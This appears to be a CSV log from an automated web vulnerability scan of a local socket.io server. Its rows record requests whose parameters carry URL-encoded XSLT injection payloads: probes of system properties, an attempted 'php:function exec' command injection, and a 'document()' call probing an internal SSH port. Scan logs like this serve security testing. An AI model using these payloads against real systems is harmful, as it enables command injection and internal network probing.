Id,Req. Timestamp,Resp. Timestamp,Método,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
81013,Tue Jun 02 01:36:07 WEST 2020,Tue Jun 02 01:36:07 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&transport=polling&t=N9n_iER,200,OK,229,229,103
81017,Tue Jun 02 01:36:07 WEST 2020,Tue Jun 02 01:36:07 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,271,92,17
81016,Tue Jun 02 01:36:07 WEST 2020,Tue Jun 02 01:36:07 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=system-property%28%27xsl%3Avendor%27%29%2F%3E&transport=polling&t=N9n_iER,200,OK,261,229,103
81020,Tue Jun 02 01:36:07 WEST 2020,Tue Jun 02 01:36:08 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=websocket&sid=%3C,400,Bad Request,266,92,18
81021,Tue Jun 02 01:36:07 WEST 2020,Tue Jun 02 01:36:08 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&transport=polling&t=N9n_iER,200,OK,265,229,103
81024,Tue Jun 02 01:36:08 WEST 2020,Tue Jun 02 01:36:08 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&transport=polling&t=N9n_iER,200,OK,290,229,103
81026,Tue Jun 02 01:36:08 WEST 2020,Tue Jun 02 01:36:08 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=websocket&sid=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,400,Bad Request,376,92,18
81028,Tue Jun 02 01:36:08 WEST 2020,Tue Jun 02 01:36:08 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F10.0.2.2%3A22%27%29%22%2F%3E&transport=polling&t=N9n_iER,200,OK,309,229,103
81029,Tue Jun 02 01:36:08 WEST 2020,Tue Jun 02 01:36:08 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=websocket&sid=system-property%28%27xsl%3Avendor%27%29%2F%3E,400,Bad Request,172,92,18
81033,Tue Jun 02 01:36:08 WEST 2020,Tue Jun 02 01:36:08 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=websocket&sid=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,400,Bad Request,302,92,18
